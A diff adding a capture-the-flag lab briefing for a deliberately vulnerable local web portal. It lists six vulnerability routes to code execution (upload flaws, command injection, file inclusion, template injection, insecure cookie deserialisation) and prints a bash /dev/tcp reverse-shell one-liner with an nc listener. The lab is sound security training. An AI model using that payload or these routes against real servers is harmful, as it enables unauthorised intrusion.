@@ -1,0 +1,66 @@
+================================================================
+ ROAD TO ROOT — Chapter 09: "Foothold"
+ Host: hollow-portal-01          Classification: CONFIDENTIAL
+================================================================
+
+OPERATOR,
+
+The other chapters handed you a shell. This one does not. Hollow
+Industries exposed an internal file-sharing and support portal —
+"Hollow Share" — to the perimeter, and BlackReef wants to know how
+far a stranger with nothing but a browser can get.
+
+You begin OUTSIDE. No SSH key, no password, no account. Your entry
+point is the web app itself, reachable from your machine at:
+
+      http://127.0.0.1:8080/
+
+Point your browser and Burp Suite at it and work the features.
+
+OBJECTIVE
+  1. Get code execution on the web server.
+  2. Catch a reverse shell back to your attacker box — you land as
+     the web user, 'www-data'.
+         Foothold flag:  /var/www/flag.txt   (www-data can read it)
+  3. Escalate from www-data to root.
+         Final flag:     /root/flag.txt      (only root can read it)
+
+THERE IS MORE THAN ONE WAY IN
+  We counted SIX independent routes to code execution on this box:
+
+    A  Upload a file that shouldn't be allowed, and run it.
+    B  The "images only" uploader that thinks it's safe. It isn't.
+    C  A network-tools feature that shells out to the OS.
+    D  A page viewer that includes whatever file you name.
+    E  A greeting preview that renders your text as a template.
+    F  A "remember me" cookie the server trusts too much.
+
+  You only need one to land a shell — but a good operator maps
+  them all, because every one is a different root cause.
+
+REVERSE SHELLS ARE THE POINT
+  Each route ends the same way: your code runs as www-data. Turn
+  that into an interactive shell on your attacker box. The classic:
+
+      # on your attacker box:
+      nc -lvnp 4444
+      # payload the web app runs:
+      bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
+
+  Then upgrade the dumb shell to a real TTY, and start enumerating
+  for the climb to root.
+
+FIRST MOVE
+  Browse every page. For each input, ask:
+      - Does this land on disk in a place the web server runs code?
+      - Does this value reach a shell, an include(), a template,
+        or unserialize()?
+  Each 'yes' is a station.
+
+The full debrief — every route, the reverse-shell catalog, and how
+the blue team detects and fixes each — is in
+  targets/web/WRITEUP.md  once you've had a proper go.
+
+Good hunting.
+— BlackReef Command
+================================================================
